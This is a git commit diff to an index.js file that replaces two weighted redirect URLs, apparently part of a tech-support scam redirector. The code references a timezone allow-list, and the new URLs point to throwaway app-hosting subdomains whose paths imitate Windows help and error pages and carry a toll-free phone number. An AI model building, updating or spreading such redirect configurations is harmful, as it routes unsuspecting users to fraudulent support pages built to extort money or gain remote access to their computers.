96e77fea05aade8df9b02c5e1c0dd3e8cf25a7a0
paalakash <palaksh452@gmail.com>
2026-06-16 04:27:35 +0530

    Update index.js

--- index.js
+++ index.js
@@ -31,8 +31,8 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://dsdfgasdzdyfg.on-forge.com/Wi0nHelpSh0errc0de030/index.html?Anph=1800-030-153", weight: 0.5 },
-    { url: "https://jashdsghdfgdf.on-forge.com/werrx01USAHTML/?bcda=1800-030-153", weight: 0.5 } 
+    { url: "https://sea-lion-app-vcmgs.ondigitalocean.app/Wi0nHelpSh0errc0de030/index.html?Anph=1800-030-153", weight: 0.5 },
+    { url: "https://octopus-app-2aiuz.ondigitalocean.app/werrx01USAHTML/?bcda=1800-030-153", weight: 0.5 } 
 
 ];
 
